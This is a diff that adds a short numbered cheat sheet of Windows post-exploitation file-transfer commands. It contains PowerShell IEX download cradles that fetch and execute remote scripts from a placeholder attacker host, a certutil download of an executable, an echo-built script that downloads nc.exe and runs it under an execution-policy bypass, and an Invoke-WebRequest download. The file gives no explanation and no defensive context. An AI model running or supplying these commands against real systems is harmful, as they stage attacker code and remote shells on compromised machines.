@@ -1,0 +1,17 @@
+1) IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file>')
+
+2) IEX(New-Object Net.WebClient).downloadString('http://<ip>/<file>')
+
+3) powershell IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file>')
+
+4) certutil -urlcache -split -f http://<ip>/<file> <file.exe>
+
+5)
+echo '$storageDir = $pwd' > wget.ps1
+echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
+echo '$url = "http://<ip>/<file>"' >> wget.ps1
+echo '$file = "nc.exe"' >> wget.ps1
+echo '$webclient.DownloadFile($url,$file)' >> wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+6) Invoke-WebRequest "http://<ip>/<file>" -OutFile "c:\"
